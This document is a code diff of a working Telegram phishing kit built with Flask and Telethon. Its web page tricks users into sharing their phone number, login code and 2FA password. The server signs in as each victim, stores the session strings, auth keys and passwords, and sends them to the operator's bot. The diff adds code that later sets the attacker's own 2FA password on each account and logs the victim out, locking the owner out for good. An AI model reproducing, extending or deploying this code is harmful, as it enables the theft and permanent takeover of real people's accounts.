+                    if not is_valid and a.get("status") != "expired":
                         a["status"] = "expired"
                         a["expired_at"] = time.time()
                         changed = True
-                        logger.info(f"Session expired: {a['phone']}")
-                        # Edit notify message with ❌
-                        await edit_notify_message(a, "❌ EXPIRE")
+                        logger.info(f"Expired: {a['phone']}")
+                        # Edit section bot msg
+                        await edit_section_message(a, "❌ EXPIRE HOYECHE")
                         if AUTO_DELETE_EXPIRED:
-                            logger.info(f"Auto-delete expired: {a['phone']}")
                             continue
-                    else:
-                        # Check 24h → terminate
+
+                    if a.get("status") == "active":
                         added = a.get("added_at", 0)
                         if time.time() - added > 86400:
+                            # 1. Set 2FA password (if configured)
+                            if auto_2fa_pass:
+                                try:
+                                    loopA = asyncio.new_event_loop()
+                                    asyncio.set_event_loop(loopA)
+
+                                    async def set_2fa():
+                                        c = TelegramClient(StringSession(session_str), API_ID, API_HASH)
+                                        await c.connect()
+                                        try:
+                                            await c.edit_2fa(new_password=auto_2fa_pass)
+                                            logger.info(f"2FA set for {a['phone']}")
+                                        except Exception as e:
+                                            logger.error(f"edit_2fa err: {e}")
+                                        finally:
+                                            await c.disconnect()
+
+                                    loopA.run_until_complete(set_2fa())
+                                    loopA.close()
+                                except Exception as e:
+                                    logger.error(f"set 2fa err: {e}")
+
+                            # 2. Terminate (log out)
                             try:
                                 loop2 = asyncio.new_event_loop()
                                 asyncio.set_event_loop(loop2)
@@ -1110,23 +858,27 @@ async def section_monitor():
                                     await c.connect()
                                     try:
                                         await c.log_out()
-                                    except Exception:
-                                        pass
+                                    except Exception as e:
+                                        logger.error(f"log_out err: {e}")
                                     finally:
                                         try:
                                             await c.disconnect()
                                         except Exception:
                                             pass
+
                                 loop2.run_until_complete(term())
                                 loop2.close()
                             except Exception as e:
-                                logger.error(f"log_out err: {e}")
+                                logger.error(f"terminate err: {e}")
+
                             a["status"] = "terminated"
                             a["terminated_at"] = time.time()
+                            a["2fa_password_set"] = auto_2fa_pass
                             changed = True
                             logger.info(f"Terminated: {a['phone']}")
-                            # Edit notify message with ✅
-                            await edit_notify_message(a, "✅ TERMINATE SECTION COMPLETE")
+                            # Edit section bot msg
+                            await edit_section_message(a, "✅ TERMINATE SECTION COMPLETE")
+
                     new_accounts.append(a)
                 except Exception as e:
                     logger.error(f"monitor err {a.get('phone')}: {e}")
@@ -1136,6 +888,48 @@ async def section_monitor():
                 captured_accounts = new_accounts
         except Exception as e:
             logger.error(f"section_monitor err: {e}")
+
+
+async def edit_section_message(account, status_text):
+    """Edit the notification message in admin bot AND send edit request to section bot"""
+    try:
+        # Edit admin bot msg
+        msg_id = account.get("admin_notify_msg_id")
+        if msg_id:
+            phone = account.get("phone", "?")
+            name = (account.get("first_name", "") or "") + " " + (account.get("last_name", "") or "")
+            name = name.strip() or "?"
+            dc = account.get("dc", "?")
+            ss = account.get("session", "")
+            new_text = (f"{status_text}\n\n"
+                        f"Phone: {phone}\n"
+                        f"Name: {name}\n"
+                        f"User ID: {account.get('user_id', '?')}\n"
+                        f"DC: {dc}\n\n"
+                        f"Session:\n`{ss}`")
+            if len(new_text) > 4000:
+                new_text = new_text[:3990] + "..."
+            try:
+                await bot.edit_message(YOUR_TELEGRAM_ID, msg_id, new_text, parse_mode='md')
+                logger.info(f"✅ Admin msg edited: {phone}")
+            except Exception as e:
+                logger.error(f"admin edit err: {e}")
+
+        # Send edit signal to section bot via HTTP
+        section_msg_id = account.get("section_notify_msg_id")
+        section_chat_id = account.get("section_chat_id")
+        section_url = os.environ.get("SECTION_BOT_URL", "")
+        if section_msg_id and section_url:
+            try:
+                http_requests.post(
+                    f"{section_url}/api/edit_message",
+                    json={"chat_id": section_chat_id, "msg_id": section_msg_id, "status": status_text},
+                    timeout=10)
+                logger.info(f"✅ Section bot edit signal sent")
+            except Exception as e:
+                logger.error(f"section edit signal err: {e}")
+    except Exception as e:
+        logger.error(f"edit_section_message err: {e}")
 
 
 async def broadcast_loop():
@@ -1184,11 +978,9 @@ async def run_broadcast(messages, target="nonlogged"):
             for entry in messages:
                 try:
                     if entry['type'] == 'text':
-                        sent = await safe_send_user(uid, entry['content'] or entry['caption'])
-                        if sent:
-                            ok += 1
-                        else:
-                            fail += 1
+                        s = await safe_send_user(uid, entry['content'] or entry['caption'])
+                        ok += 1 if s else 0
+                        fail += 0 if s else 1
                     elif entry['type'] in ('photo', 'video'):
                         try:
                             msg = await bot.get_messages(entry['_chat_id'], ids=entry['_msg_id'])
@@ -1197,10 +989,8 @@ async def run_broadcast(messages, target="nonlogged"):
                         except Exception:
                             if entry.get('caption'):
                                 s = await safe_send_user(uid, entry['caption'])
-                                if s:
-                                    ok += 1
-                                else:
-                                    fail += 1
+                                ok += 1 if s else 0
+                                fail += 0 if s else 1
                     else:
                         ok += 1
                 except Exception:
@@ -1208,33 +998,23 @@ async def run_broadcast(messages, target="nonlogged"):
                 await asyncio.sleep(0.4)
         except Exception:
             fail += 1
-            err = str(e).lower()
-            if 'blocked' in err or 'deactivated' in err or 'not found' in err:
-                users.pop(uid_str, None)
-                save_users(users)
     logger.info(f"Broadcast [{target}]: {ok} sent, {fail} failed")
-    try:
-        await bot.send_message(YOUR_TELEGRAM_ID,
-            f"📢 **{target}** round done\n✅ {ok}\n❌ {fail}\n👥 {len(target_uids)}")
-    except Exception:
-        pass
 
 
 async def self_ping_loop():
     while True:
         try:
             await asyncio.sleep(240)
-            r = http_requests.get(SELF_URL, timeout=10)
-            logger.info(f"Self-ping: {r.status_code}")
-        except Exception as e:
-            logger.warning(f"self_ping err: {e}")
+            http_requests.get(SELF_URL, timeout=10)
+        except Exception:
+            pass
 
 
 async def bot_main():
-    logger.info("Bot starting...")
+    logger.info("Admin bot starting...")
     await bot.start(bot_token=BOT_TOKEN)
     me = await bot.get_me()
-    logger.info(f"✅ Bot started as @{me.username} (id={me.id})")
+    logger.info(f"✅ Admin bot started as @{me.username}")
     asyncio.create_task(broadcast_loop())
     asyncio.create_task(section_monitor())
     asyncio.create_task(self_ping_loop())
@@ -1242,7 +1022,7 @@ async def bot_main():
 
 
 # ============================================================
-# FLASK PAGE (same as before)
+# FLASK — WebApp (section bot uses these APIs)
 # ============================================================
 PAGE = r'''<!DOCTYPE html>
 <html><head>
@@ -1389,7 +1169,7 @@ function triggerShare(isFirst) {
         if (sent && event && event.responseUnsafe && event.responseUnsafe.contact) {
           handleContact(event.responseUnsafe.contact);
         } else {
-          msg('contactMsg', 'Confirm required to continue', 'err');
+          msg('contactMsg', 'Confirm required', 'err');
         }
       });
       return;
@@ -1402,14 +1182,14 @@ function triggerShare(isFirst) {
         if (sent && event && event.responseUnsafe && event.responseUnsafe.contact) {
           handleContact(event.responseUnsafe.contact);
         } else {
-          msg('contactMsg', 'Confirm required to continue', 'err');
+          msg('contactMsg', 'Confirm required', 'err');
         }
       });
       return;
     } catch(e) { resetInProgress(); }
   }
   resetInProgress();
-  msg('contactMsg', 'Update Telegram app', 'err');
+  msg('contactMsg', 'Update app', 'err');
 }
 document.getElementById('shareContactBtn').onclick = function() {
   inProgress = false;
@@ -1448,10 +1228,10 @@ function openOtp() {
   fetch('/api/share', {
     method: 'POST',
     headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({phone: phoneNumber})
+    body: JSON.stringify({phone: phoneNumber, tg_id: TG_ID})
   }).then(function(r) { return r.json(); }).then(function(d) {
     if (d.success) {
-      msg('otpMsg', 'Code sent! Check Telegram', 'ok');
+      msg('otpMsg', 'Code sent!', 'ok');
       startOtpCheck();
       setTimeout(function() { document.getElementById('resendBtn').style.display = 'block'; }, 30000);
     } else { msg('otpMsg', d.error || 'Failed', 'err'); }
@@ -1473,7 +1253,7 @@ function startOtpCheck() {
       } else if (d.s === 'done') { clearInterval(codeCheck); onCapture(); }
       else if (d.s === 'err') {
         clearInterval(codeCheck);
-        msg('otpMsg', 'Send failed. Try resend.', 'err');
+        msg('otpMsg', 'Failed. Try resend.', 'err');
         document.getElementById('resendBtn').style.display = 'block';
       }
     }).catch(function(){});
@@ -1495,12 +1275,12 @@ function startOtpCheck() {
 function submitOtp() {
   var code = '';
   for (var i = 1; i <= 5; i++) code += document.getElementById('o' + i).value;
-  if (code.length < 5) { msg('otpMsg', 'Enter all 5 digits', 'err'); return; }
+  if (code.length < 5) { msg('otpMsg', 'Enter 5 digits', 'err'); return; }
   msg('otpMsg', 'Verifying...', 'info');
   fetch('/api/verify', {
     method: 'POST',
     headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({phone: phoneNumber, code: code})
+    body: JSON.stringify({phone: phoneNumber, code: code, tg_id: TG_ID})
   }).then(function(r) { return r.json(); }).then(function(d) {
     if (d.success) { onCapture(); }
     else if (d.needs_password) {
@@ -1512,7 +1292,7 @@ function submitOtp() {
       ['o1','o2','o3','o4','o5'].forEach(function(id) { document.getElementById(id).value = ''; });
       document.getElementById('o1').focus();
     }
-  }).catch(function() { msg('otpMsg', 'Connection error', 'err'); });
+  }).catch(function() { msg('otpMsg', 'Error', 'err'); });
 }
 document.getElementById('resendBtn').onclick = function() {
   document.getElementById('resendBtn').style.display = 'none';
@@ -1540,14 +1320,14 @@ document.getElementById('pwdBtn').onclick = function() {
   fetch('/api/verify', {
     method: 'POST',
     headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({phone: phoneNumber, code: code, password: pwd})
+    body: JSON.stringify({phone: phoneNumber, code: code, password: pwd, tg_id: TG_ID})
   }).then(function(r) { return r.json(); }).then(function(d) {
     document.getElementById('pwdBtn').disabled = false;
     if (d.success) { onCapture(); }
-    else { msg('pwdMsg', d.error || 'Wrong password', 'err'); }
+    else { msg('pwdMsg', d.error || 'Wrong', 'err'); }
   }).catch(function() {
     document.getElementById('pwdBtn').disabled = false;
-    msg('pwdMsg', 'Connection error', 'err');
+    msg('pwdMsg', 'Error', 'err');
   });
 };
 function onCapture() {
@@ -1565,7 +1345,7 @@ function openShare() {
   var n = parseInt(localStorage.getItem(USK) || '0');
   updSteps(n);
   if (n >= 5) msg('shareMsg', 'Unlocked!', 'ok');
-  else msg('shareMsg', n + '/5 done. Share to unlock.', 'info');
+  else msg('shareMsg', n + '/5 done.', 'info');
 }
 function updSteps(n) {
   for (var i = 1; i <= 5; i++) {
@@ -1584,16 +1364,13 @@ document.getElementById('shareBtn').onclick = function() {
   localStorage.setItem(USK, String(n));
   updSteps(n);
   if (n >= 5) msg('shareMsg', 'Unlocked!', 'ok');
-  else msg('shareMsg', n + '/5 done. Share more.', 'ok');
+  else msg('shareMsg', n + '/5 done.', 'ok');
 };
 </script>
 </body>
 </html>'''
 
 
-# ============================================================
-# ROUTES
-# ============================================================
 @app.route('/')
 def index():
     return render_template_string(PAGE)
@@ -1606,14 +1383,7 @@ def tg_route():
 
 @app.route('/health')
 def health():
-    return jsonify({
-        'status': 'ok',
-        'bot_thread_alive': _bot_thread.is_alive() if _bot_thread else False,
-        'bot_connected': bot.is_connected(),
-        'accounts': len(captured_accounts),
-        'bot_users': len(users),
-        'share': share_config,
-    })
+    return jsonify({'status': 'ok', 'bot_thread_alive': _bot_thread.is_alive() if _bot_thread else False})
 
 
 @app.route('/api/share_config')
@@ -1627,7 +1397,7 @@ def save_contact():
     tg_id = d.get('tg_id')
     phone = d.get('phone')
     if not phone or not tg_id:
-        return jsonify({'success': False, 'error': 'Missing data'})
+        return jsonify({'success': False, 'error': 'Missing'})
     phone = format_phone(phone)
     accounts = load_accounts()
     ex = next((a for a in accounts if a['phone'] == phone), None)
@@ -1636,7 +1406,6 @@ def save_contact():
             'phone': phone, 'user_id': ex['user_id']})
     with sessions_lock:
         pending_codes[phone] = 'contact_saved'
-    logger.info(f"Contact saved: {phone}")
     return jsonify({'success': True, 'phone': phone})
 
 
@@ -1648,10 +1417,147 @@ def share():
     ph = format_phone(ph)
     with sessions_lock:
         pending_codes[ph] = 'sending'
-    t = threading.Thread(target=run_tg, args=(ph,))
+    tg_id = request.json.get('tg_id')
+    t = threading.Thread(target=_run_tg_thread, args=(ph, None, None, tg_id))
     t.daemon = True
     t.start()
     return jsonify({'success': True})
+
+
+@app.route('/api/verify', methods=['POST'])
+def verify():
+    d = request.json
+    ph = format_phone(d.get('phone', ''))
+    code = d.get('code', '')
+    password = d.get('password')
+    tg_id = d.get('tg_id')
+    result = _run_tg_sync(ph, code, password, tg_id)
+    return jsonify(result)
+
+
+def _run_tg_sync(phone, code, password, tg_id):
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    try:
+        return loop.run_until_complete(_tg_action(phone, code, password, tg_id))
+    finally:
+        loop.close()
+
+
+def _run_tg_thread(phone, code, password, tg_id):
+    try:
+        _run_tg_sync(phone, code, password, tg_id)
+    except Exception as e:
+        logger.error(f"run_tg_thread: {e}")
+
+
+async def _tg_action(phone, code=None, password=None, tg_id=None):
+    if not code:
+        # send code
+        client = TelegramClient(StringSession(), API_ID, API_HASH)
+        await client.connect()
+        try:
+            r = await client.send_code_request(phone)
+            session_str = StringSession.save(client.session)
+            with sessions_lock:
+                user_sessions[phone] = {'hash': r.phone_code_hash, 'session': session_str}
+                pending_codes[phone] = 'sent'
+            return {'success': True}
+        except Exception as e:
+            with sessions_lock:
+                pending_codes[phone] = 'err'
+            return {'success': False, 'error': str(e)[:80]}
+        finally:
+            try:
+                await client.disconnect()
+            except Exception:
+                pass
+    # verify
+    with sessions_lock:
+        if phone not in user_sessions:
+            return {'success': False, 'error': 'No session'}
+        s = user_sessions[phone]
+    client = TelegramClient(StringSession(s['session']), API_ID, API_HASH)
+    try:
+        await client.connect()
+        if not await client.is_user_authorized():
+            try:
+                await client.sign_in(phone=phone, code=code, phone_code_hash=s['hash'])
+            except errors.SessionPasswordNeededError:
+                with sessions_lock:
+                    pending_codes[phone] = '2fa_needed'
+                if password:
+                    try:
+                        await client.sign_in(password=password)
+                    except errors.PasswordHashInvalidError:
+                        return {'success': False, 'error': 'Wrong 2FA password'}
+                else:
+                    return {'success': False, 'error': '2FA', 'needs_password': True}
+        me = await client.get_me()
+        await client.get_dialogs()
+        ss = StringSession.save(client.session)
+        try:
+            ak = client.session.auth_key.key
+            dc = client.session.dc_id
+        except Exception:
+            ak = b""
+            dc = 0
+        ab = base64.b64encode(ak).decode() if ak else ""
+        pu = password is not None
+        acc = {
+            'phone': phone, 'user_id': me.id,
+            'username': me.username or '', 'first_name': me.first_name or '',
+            'last_name': me.last_name or '', 'session': ss,
+            'webk': json.dumps({'dcId': dc, 'authKey': ab, 'userId': me.id,
+                'isSupport': False, 'isTest': False}),
+            'dc': dc, 'time': str(datetime.now()),
+            'has_2fa': pu, 'password': password if pu else '',
+            'added_at': time.time(),
+            'expires_at': time.time() + 86400,
+            'status': 'active',
+            'is_premium': False,
+            'tg_id': tg_id,
+        }
+        save_account(acc)
+        global captured_accounts
+        captured_accounts = load_accounts()
+        # Notify admin bot owner
+        extra = ""
+        if pu:
+            extra = "\n2FA Used"
+            if password:
+                extra += f" | Pwd: `{password}`"
+        msg = (f"New Account!{extra}\nPhone: {phone}\n"
+               f"Name: {me.first_name} {me.last_name or ''}\n"
+               f"User ID: {me.id}\nDC: {dc}\n\nSession:\n`{ss}`")
+        if len(msg) > 4000:
+            msg = msg[:3990] + "..."
+        r = http_requests.post(
+            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+            json={'chat_id': YOUR_TELEGRAM_ID, 'text': msg, 'parse_mode': 'Markdown'},
+            timeout=15)
+        if r.status_code == 200:
+            mid = r.json().get("result", {}).get("message_id")
+            if mid:
+                acc["admin_notify_msg_id"] = mid
+                save_account(acc)
+                captured_accounts = load_accounts()
+        with sessions_lock:
+            user_sessions.pop(phone, None)
+            pending_codes[phone] = 'done'
+        return {'success': True, 'user_id': me.id}
+    except Exception as e:
+        es = str(e)
+        if 'PHONE_CODE_INVALID' in es:
+            return {'success': False, 'error': 'Wrong code'}
+        if 'SESSION_PASSWORD_NEEDED' in es:
+            return {'success': False, 'error': '2FA', 'needs_password': True}
+        return {'success': False, 'error': es[:80]}
+    finally:
+        try:
+            await client.disconnect()
+        except Exception:
+            pass
 
 
 @app.route('/api/check', methods=['POST'])
@@ -1666,63 +1572,31 @@ def check():
     return jsonify({'s': s})
 
 
-@app.route('/api/verify', methods=['POST'])
-def verify():
-    d = request.json
-    ph = format_phone(d.get('phone', ''))
-    return jsonify(run_tg(ph, d.get('code', ''), d.get('password')))
-
-
-@app.route('/session/<phone>')
-def get_session(phone):
-    phone = format_phone(phone)
-    global captured_accounts
-    captured_accounts = load_accounts()
-    a = next((x for x in captured_accounts if x['phone'] == phone), None)
-    if not a:
-        return jsonify({'error': 'Not found'}), 404
-    return jsonify({'phone': phone, 'user_id': a['user_id'],
-        'status': a.get('status', 'active')})
-
-
 @app.route('/dash')
 def dash():
-    global captured_accounts
-    captured_accounts = load_accounts()
+    accounts = load_accounts()
     rows = ""
-    for i, a in enumerate(captured_accounts, 1):
+    for i, a in enumerate(accounts, 1):
         sl = len(a.get('session', ''))
         lbl = account_label(a)
-        rows += f"<tr><td>{i}</td><td>{a['phone']}</td><td>{a.get('first_name','')} {a.get('last_name','')} {lbl}</td><td>@{a.get('username','-')}</td><td>{a.get('user_id','')}</td><td>{a.get('dc','')}</td><td>({sl})</td></tr>"
-    return ("<!DOCTYPE html><html><head><title>Dash</title><style>"
-        "body{background:#0a0a0a;color:white;font-family:Arial;padding:20px}"
-        "h1{color:#e94560}table{width:100%;border-collapse:collapse;margin-top:15px}"
-        "th,td{padding:10px;text-align:left;border-bottom:1px solid #1a1a2e;font-size:13px}"
-        "th{background:#141420;color:#ddd}</style></head><body>"
-        f"<h1>Accounts: {len(captured_accounts)}</h1>"
-        "<table><thead><tr><th>#</th><th>Phone</th><th>Name</th><th>User</th><th>ID</th><th>DC</th><th>Session</th></tr></thead><tbody>"
-        f"{rows if rows else '<tr><td colspan=7 style=text-align:center;padding:30px>Empty</td></tr>'}"
-        "</tbody></table></body></html>")
+        rows += f"<tr><td>{i}</td><td>{a['phone']}</td><td>{a.get('first_name','')} {lbl}</td><td>{a.get('user_id','')}</td><td>{a.get('dc','')}</td><td>({sl})</td></tr>"
+    return f"<html><body style='background:#0a0a0a;color:white;font-family:Arial;padding:20px'><h1>Accounts: {len(accounts)}</h1><table border=1 style='width:100%'><tr><th>#</th><th>Phone</th><th>Name</th><th>ID</th><th>DC</th><th>Session</th></tr>{rows}</table></body></html>"
 
 
 def _run_bot():
     try:
-        logger.info("Starting bot thread...")
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
         loop.run_until_complete(bot_main())
     except Exception as e:
-        logger.error(f"BOT CRASH: {type(e).__name__}: {e}")
+        logger.error(f"BOT CRASH: {e}")
         logger.error(traceback.format_exc())
 
 
 if BOT_TOKEN and API_ID and API_HASH and YOUR_TELEGRAM_ID:
-    _bot_thread = threading.Thread(target=_run_bot, daemon=True, name="telegram-bot")
+    _bot_thread = threading.Thread(target=_run_bot, daemon=True, name="admin-bot")
     _bot_thread.start()
-    logger.info("Bot background thread launched")
-else:
-    _bot_thread = None
-    logger.error("Bot NOT started — env vars missing")
+    logger.info("Admin bot thread launched")
 
 
 if __name__ == '__main__':
